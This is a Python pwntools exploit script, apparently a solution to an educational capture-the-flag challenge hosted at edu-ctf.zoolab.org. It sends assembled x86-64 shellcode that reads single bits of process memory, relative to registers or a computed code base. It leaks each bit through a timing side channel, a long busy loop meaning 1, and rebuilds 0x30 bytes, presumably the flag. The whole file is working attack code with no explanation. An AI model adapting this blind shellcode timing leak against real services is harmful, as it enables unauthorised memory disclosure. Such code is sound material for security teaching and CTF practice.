from pwn import *

context.arch = 'amd64'

def get_a_bit(register, reg_offset, bit, local):
    if local == 1:
        p = process('./chal')
    else:
        p = remote( 'edu-ctf.zoolab.org', 10002 )

    payload = asm('mov al, BYTE PTR ds:[' + register + '+' + str( reg_offset ) + '''];
                   xor r11, r11;
                   shr al, ''' + str( bit ) +''';
                   shl al, 7;
                   shr al, 7;
                   imul rax, 0x20000000
                   loop_start:
                   cmp rax, r11;
                   je loop_finished;
                   inc r11;
                   imul ebx, 0x13;
                   jmp loop_start;
                   loop_finished:
                   ''')
    p.sendline( payload )
    current = time.time()
    print( p.recvall() )
    now = time.time()
    diff = now - current
    print(diff)
    if diff > 0.2:
        print('the bit is 1')
        return 1
    else:
        print('the bit is 0')
        return 0
    p.close()

def get_code_base_bit( reg_offset, bit, local ):
    if local == 1:
        p = process('./chal')
    else:
        p = remote( 'edu-ctf.zoolab.org', 10002 )

    print( p.recvline() )
    payload = asm('''mov rbx, QWORD PTR ds:[rbp+0x48];
                   sub rbx, 0x289;
                   sub rbx, 0x1000;
                   add rbx, 0x4040;
                   mov al, BYTE PTR ds:[rbx+ ''' + str( reg_offset ) + '''];
                   xor r11, r11;
                   shr al, ''' + str( bit ) +''';
                   shl al, 7;
                   shr al, 7;
                   imul rax, 0x30000000
                   loop_start:
                   cmp rax, r11;
                   je loop_finished;
                   inc r11;
                   imul ebx, 0x29;
                   imul ebx, 0x19;
                   imul ebx, 0x23;
                   imul ebx, 0x17;
                   jmp loop_start;
                   loop_finished:
                   ''')
    p.sendline( payload )
    current = time.time()
    print( p.recvall() )
    now = time.time()
    diff = now - current
    print(diff)
    if diff > 1:
        print('the bit is 1')
        return 1
    else:
        print('the bit is 0')
        return 0
    p.close()

def get_a_byte( register, reg_offset, local ):
    bit_string = ''
    for i in range(8):
        bit_string = str( get_a_bit( register, reg_offset, i, local ) ) + bit_string
    print( bit_string )
    return int( bit_string, 2 )

def get_code_base_byte( reg_offset, local ):
    bit_string = ''
    for i in range(8):
        bit_string = str( get_code_base_bit( reg_offset, i, local ) ) + bit_string
    print( chr( int( bit_string, 2 ) ) )
    return int( bit_string, 2 )

local = 0

#byte = hex( get_a_byte( 'rip', 0x0, local ) )
#print( 'current byte is', byte )

#byte = hex( get_a_byte( 'rbp', 0x48 + 5, local ) )
#print( 'current byte is', byte )
#input('>')
#byte = hex( get_a_byte( 'rbp', 0x48, local ) ) # 0x89
#print( 'current byte is', byte )
#input('>')
#byte = hex( get_a_byte( 'rbp', 0x48 + 1, local ) ) #0x?2
#print( 'current byte is', byte )


content = ''
for i in range( 0x30 ):
    byte = ( get_code_base_byte( i, local ) )
    content += chr( byte )
    print( content )
